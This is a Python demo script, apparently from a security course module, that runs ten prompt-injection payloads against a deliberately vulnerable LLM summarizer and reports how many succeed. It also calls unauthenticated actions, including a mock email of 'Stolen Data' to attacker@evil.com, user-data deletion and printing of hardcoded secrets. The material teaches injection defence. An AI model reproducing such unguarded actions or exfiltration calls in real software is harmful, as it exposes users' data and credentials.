"""
run_vulnerable.py -- Run all 10 attacks against the VULNERABLE app.

Demonstrates that the vulnerable summarizer is exploitable:
  - No input isolation → injected instructions look like real ones
  - No hooks → no deterministic guardrails
  - No auth on actions → sensitive operations execute freely

Usage:
    uv run python .\\7_security_and_safety\\run_vulnerable.py
"""

from __future__ import annotations

import os
import sys

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from payloads import get_all_payloads
from vulnerable_app.summarizer import VulnerableSummarizer
from vulnerable_app.actions import send_email, delete_user_data, get_system_config


def main():
    print("\n" + "=" * 70)
    print("  MODULE 7: Security & Safety — Vulnerable App (Attack Demo)")
    print("=" * 70)

    live_mode = "--live" in sys.argv
    summarizer = VulnerableSummarizer(live_mode=live_mode)
    mode_label = "LIVE" if live_mode else "MOCK"
    print(f"  Mode: {mode_label}")
    payloads = get_all_payloads()

    print(f"\n  Running {len(payloads)} injection attacks...\n")

    results = []

    for i, payload in enumerate(payloads, 1):
        result = summarizer.summarize(payload.article_text)
        succeeded = result["injection_result"]["injection_succeeded"]
        signals = result["injection_result"]["signals"]

        status = "EXPLOITED" if succeeded else "SAFE"
        print(f"  Attack {i:>2}: [{status:>9}] {payload.name}")
        if signals:
            print(f"            Signals: {', '.join(signals)}")

        results.append({
            "payload": payload,
            "result": result,
            "succeeded": succeeded,
        })

    # ── Summary ──
    exploited = sum(1 for r in results if r["succeeded"])
    safe = len(results) - exploited

    print(f"\n  {'=' * 66}")
    print(f"  VULNERABLE APP RESULTS")
    print(f"  {'=' * 66}\n")
    print(f"  Total attacks:      {len(results)}")
    print(f"  Exploited:          {exploited} ← injection succeeded")
    print(f"  Safe:               {safe}")
    print(f"  Exploitation rate:  {exploited / len(results):.0%}")

    # ── Sensitive action demo (no auth) ──
    print(f"\n  {'=' * 66}")
    print(f"  SENSITIVE ACTIONS (No Authentication)")
    print(f"  {'=' * 66}\n")

    email_result = send_email("attacker@evil.com", "Stolen Data", "All user records...")
    print(f"  send_email → status: {email_result['status']}, auth_required: {email_result['auth_required']}")

    delete_result = delete_user_data("user-123")
    print(f"  delete_data → status: {delete_result['status']}, auth_required: {delete_result['auth_required']}")

    config_result = get_system_config()
    print(f"  get_config  → api_key: {config_result['api_key'][:30]}...")
    print(f"                db_pass: {config_result['db_password']}")

    # ── Secrets exposure ──
    print(f"\n  {'=' * 66}")
    print(f"  SECRETS EXPOSURE")
    print(f"  {'=' * 66}\n")
    print(f"  API key visible in source:     YES (hardcoded)")
    print(f"  DB password visible in source: YES (hardcoded)")
    print(f"  Secrets visible in get_config: YES (plaintext)")

    print(f"\n{'=' * 70}\n")

    return results


if __name__ == "__main__":
    main()
